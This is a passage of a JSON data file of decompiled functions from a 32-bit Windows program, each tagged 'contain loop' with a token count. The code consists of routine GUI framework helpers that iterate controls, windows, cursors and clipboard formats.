        "decompiled_code": "\nvoid __cdecl fcn.0041d150(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406858();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00419680();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0041faec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041faec(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.004197d8();\n                fcn.0041faec();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0042026c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042026c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004197d8(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "004202e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004202e8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x50) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.004197d8();\n            if (param_2 == iVar1) {\n                *(param_2 + 0x10) = 0;\n                fcn.004196cc();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0042085c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042085c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x42086c;\n    iVar1 = fcn.00419b48();\n    uStack24 = 0x4208b1;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004197d8();\n            fcn.00404640();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4208b8;\n    uStack24 = 0x4208b0;\n    fcn.00419bac();\n    return;\n}\n",
        "token_count": 230
    },
    "0042cde8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0042cde8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.004197d8();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00430ddc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00430ddc(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_1h;\n    \n    puStack16 = 0x430dec;\n    (**(**(arg_8h + -4) + 0x18))();\n    uStack20 = 0x430e4b;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack28 = 0;\n    puStack16 = &fcn.00430ddc::var_1h + 1;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while ((uVar2 != 0 && (cVar1 = fcn.00426cac(),  cVar1 == '\\0'))) {\n        uStack28 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    *in_FS_OFFSET = uStack28;\n    uStack20 = 0x430e52;\n    uStack24 = 0x430e4a;\n    (**(**(arg_8h + -4) + 0x14))();\n    return;\n}\n",
        "token_count": 319
    },
    "00433e0c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00433e0c(uint8_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.004359b8();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if (iVar3 < param_2) {\n                iVar2 = fcn.004359c8();\n                if (param_1 < *(iVar2 + 0x3f)) {\n                    fcn.00432eac();\n                }\n            }\n            else {\n                iVar2 = fcn.004359c8();\n                if (*(iVar2 + 0x3f) <= param_1 && param_1 != *(iVar2 + 0x3f)) {\n                    iVar2 = fcn.004359c8();\n                    *(iVar2 + 0x3f) = param_1;\n                }\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00435a80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435a80(code *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004359b8();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004359c8();\n            (*arg_8h)();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00435ee4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00435ee4(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.004359b8();\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.004359c8();\n            (**(*piVar2 + 0x40))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00435f78": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00435f78(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        in_EAX = *(iVar1 + 100);\n    } while (in_EAX != 0);\n    return *(iVar1 + 0x70);\n}\n",
        "token_count": 74
    },
    "00437204": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437204(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    for (; (0 < param_2 && (in_EAX != 0)); in_EAX = *(in_EAX + 100)) {\n        param_2 = param_2 + -1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00438588": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438588(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            piVar1 = fcn.004197d8();\n            if (param_2 == *piVar1) {\n                puVar2 = fcn.004197d8();\n                *puVar2 = 0;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "0043adfc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043adfc(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(in_EAX[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(in_EAX[1], 0xffffffff);\n            }\n            in_EAX = *in_EAX;\n            fcn.00402f0c();\n        } while (in_EAX != NULL);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0043ea0c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0043ea0c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = fcn.00457a28(2);\n    iVar2 = (***0x49280c)(uVar1);\n    iVar3 = fcn.004431ec();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.004431d8();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.004431d8();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.004440c4();\n    iVar3 = fcn.004431ec();\n    if (-1 < iVar3 + -1) {\n        do {\n            iVar4 = fcn.004431d8();\n            if (iVar2 == *(iVar4 + 4)) {\n                uVar1 = fcn.004431d8();\n                return uVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "00440490": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440490(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        do {\n            iVar3 = param_2;\n            param_2 = *(iVar3 + 0x30);\n            if (param_2 == 0) break;\n            cVar1 = fcn.004047cc();\n        } while (cVar1 == '\\0');\n        if ((iVar3 != 0) && (param_1 != iVar3)) {\n            uVar2 = fcn.00457a28();\n            sub.user32.dll_SendMessageA(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00443388": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00443388(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    puVar1 = *(in_EAX + 0x5c);\n    while (puVar1 != NULL) {\n        iVar2 = puVar1[1];\n        if ((((-0x12 < iVar2) && (iVar2 < -0xb)) || (iVar2 == -0x15)) || (0 < iVar2)) {\n            sub.user32.dll_DestroyCursor();\n        }\n        puVar1 = *puVar1;\n        fcn.00402f0c();\n    }\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    if (iVar2 != *(in_EAX + 0x60)) {\n        sub.user32.dll_DestroyCursor(*(in_EAX + 0x60));\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0044408c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044408c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(*(in_EAX + 0x58) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.004197d8();\n            fcn.00404640();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    (**(**(*0x497c18 + 0x58) + 8))();\n    return;\n}\n",
        "token_count": 125
    },
    "004440e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.004440e8(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.004431ec();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004431d8();\n            cVar1 = fcn.00442f4c();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.004431d8();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004440c4();\n    iVar2 = fcn.004431ec();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.004431d8();\n            cVar1 = fcn.00442f4c();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.004431d8();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 253
    },
    "00444858": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444858(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00406860();\n    if (-1 < iVar1) {\n        iVar1 = iVar1 + 1;\n        iVar2 = 0;\n        do {\n            if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n                *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = 0;\n                *(*(in_EAX + 0xd0) + iVar2 * 0xc) = 0xffffffff;\n                return;\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0044621c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044621c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.00443238();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.00443224();\n            cVar1 = fcn.00457d34();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.00457a28();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.00457a28();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xec))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00446468": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00446468(void)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    iVar1 = fcn.0044321c();\n    if (-1 < iVar1 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00443208();\n            fcn.00450f7c(arg_8h);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00447200": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00447200(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetCapture();\n    if (iVar1 == 0) {\n        iVar1 = *(in_EAX + 0x44);\n        if ((iVar1 == 0) || (*param_2 != *(iVar1 + 0x29c))) {\n            iVar1 = fcn.0044c724();\n            while ((iVar1 == 0 && (iVar2 = sub.user32.dll_GetParent(),  iVar2 != 0))) {\n                iVar1 = fcn.0044c724();\n            }\n        }\n        if (iVar1 != 0) {\n            uVar3 = fcn.0040483c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 212
    },
    "0044853c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044853c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.004197d8();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.004196cc();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00449b7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449b7c(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405894(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.004054c0();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00449e80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449e80(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00449edc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449edc(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00449f40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449f40(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x74))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044a0d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044a0d8(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 222
    },
    "0044cb44": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044cb44(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.004197d8();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 156
    },
    "0044cb7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044cb7c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.00457a28();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0044cc60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044cc60(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iVar4 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStack20 = 0x44cc7b;\n            piVar2 = fcn.004197d8();\n            iVar4 = *piVar2;\n        }\n        else {\n            iStack20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 == 0 && (iVar3 != 0))) {\n                cVar1 = fcn.0044cb44();\n                if (cVar1 == '\\0') {\n                    iVar3 = func_0x0040821c(iVar3, 2);\n                }\n                else {\n                    iVar4 = **(*(in_EAX + 4) + iStack20 * 4);\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, iVar4);\n}\n",
        "token_count": 274
    },
    "0044d6e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044d6e4(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.0044d684(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 109
    },
    "0044e208": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044e208(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.0044c724(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 113
    },
    "0044f830": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0044f830(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\n                fcn.00440398();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00453880": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00453880(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 90
    },
    "00454214": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00454214(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00419834();\n    iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.004197d8();\n            if (*(iVar2 + 0x1b4) != 0) {\n                return *(iVar2 + 0x1b4);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 180
    },
    "00458dc8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458dc8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xdfff;\n    }\n    else {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x2000;\n    }\n    if ((*(in_EAX + 0x1d0) != 0) && (iVar1 = *(*(in_EAX + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        do {\n            fcn.004197d8();\n            fcn.00458dc8();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "004598cc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004598cc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00459968();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 99
    },
    "00459930": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00459930(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 93
    },
    "00459944": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00459944(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.00459f8c();\n    while (iVar1 != 0) {\n        iVar1 = fcn.00459f64();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 88
    },
    "00459968": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.00459968(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.00459f8c(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.00459968();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 161
    },
    "00459cdc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00459cdc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.00459f64();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 121
    },
    "00459eb4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00459eb4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 69
    },
    "00459ec4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00459ec4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.00459eb0();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.00459930();\n        if (0 < iVar2) {\n            fcn.00459eb4();\n            fcn.00459ec4();\n        }\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00459f04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00459f04(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.00459e88();\n        iVar3 = fcn.004599a0();\n        if (iVar2 < iVar3) {\ncode_r0x00459f38:\n            fcn.00459b6c();\n            fcn.0045a244(0x45bd40, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.00459e88();\n            iVar3 = fcn.004599e8();\n            if (iVar3 < iVar2) goto code_r0x00459f38;\n        }\n        fcn.00459f04();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 229
    },
    "00459f70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00459f70(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.00459968();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 118
    },
    "0045a208": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a208(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045a208(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045a208(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045b360": {
        "rules": [
            "contain loop"
        ],
